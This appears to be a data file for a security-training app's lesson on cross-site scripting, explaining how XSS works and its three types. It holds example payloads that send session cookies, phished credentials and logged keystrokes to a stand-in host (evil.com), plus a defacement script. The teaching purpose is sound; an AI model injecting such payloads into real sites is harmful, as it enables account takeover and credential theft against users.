export const LEARN_CONTENT = {
  xss: {
    title: "Cross-Site Scripting (XSS)",
    color: "cyan",
    sections: [
      {
        type: "intro",
        heading: "What is XSS?",
        body: "Cross-Site Scripting (XSS) lets an attacker inject their own JavaScript into a webpage that other users visit. Instead of attacking the server directly, you're attacking the people using the site.",
      },
      {
        type: "flow",
        heading: "How does it work?",
        steps: [
          { icon: "🧑‍💻", label: "Attacker", detail: "Types malicious script into an input field" },
          { icon: "🌐", label: "Server",   detail: "Saves or reflects the input without sanitizing it" },
          { icon: "👤", label: "Victim",   detail: "Loads the page — the script runs in their browser" },
          { icon: "💀", label: "Exploit",  detail: "Cookies stolen, page defaced, keystrokes logged" },
        ],
      },
      {
        type: "code",
        heading: "What a basic payload looks like",
        language: "html",
        code: `<!-- Normal comment input -->
<input value="Hello!" />

<!-- XSS payload injected instead -->
<input value=""><script>alert('XSS')</script>" />

<!-- The browser sees and executes the script -->`,
      },
      {
        type: "cards",
        heading: "Why is it dangerous?",
        items: [
          {
            icon: "🍪", title: "Cookie Theft", side: "left",            body: "Steal session cookies to log in as the victim.",
            code: `// Injected into a vulnerable page
<script>
  // Grab the victim's session cookie
  const stolen = document.cookie;

  // Send it to the attacker's server
  fetch("https://evil.com/steal?c=" + stolen);
</script>`,
          },
          {
            icon: "🎣", title: "Phishing", side: "right",            body: "Inject fake login forms to capture credentials.",
            code: `// Injected into a vulnerable page
<script>
  // Replace the page with a fake login form
  document.body.innerHTML = \`
    <form action="https://evil.com/capture">
      <p>Session expired. Please log in again.</p>
      <input name="user" placeholder="Username" />
      <input name="pass" placeholder="Password" type="password"/>
      <button>Login</button>
    </form>
  \`;
</script>`,
          },
          {
            icon: "🖥️", title: "Page Defacement", side: "left",            body: "Modify what the victim sees on the page.",
            code: `// Injected into a vulnerable page
<script>
  // Wipe the entire page content
  document.body.innerHTML = \`
    <div style="background:#000;color:red;
                font-size:48px;text-align:center">
      <br/><br/>
      💀 You've been hacked 💀
    </div>
  \`;
</script>`,
          },
          {
            icon: "⌨️", title: "Keylogging", side: "right",            body: "Record every keystroke the victim types.",
            code: `// Injected into a vulnerable page
<script>
  let log = "";

  // Listen to every key the victim presses
  document.addEventListener("keydown", (e) => {
    log += e.key;

    // Send to attacker every 5 seconds
    if (log.length % 20 === 0) {
      fetch("https://evil.com/keys?k=" + log);
    }
  });
</script>`,
          },
        ],
      },
      {
        type: "types",
        heading: "Three types of XSS",
        items: [
          { name: "Reflected",  color: "yellow", desc: "Payload is in the URL. Only affects users who click the crafted link." },
          { name: "Stored",     color: "orange", desc: "Payload is saved to the database. Affects every user who loads the page." },
          { name: "DOM-based",  color: "red",    desc: "Payload manipulates the page's DOM directly via JavaScript." },
        ],
      },
      {
        type: "cta",
        heading: "Ready to practice?",
        body: "You'll start with reflected XSS — the simplest form. Your goal is to inject a script into a vulnerable comment board.",
      },
    ],
  },
};
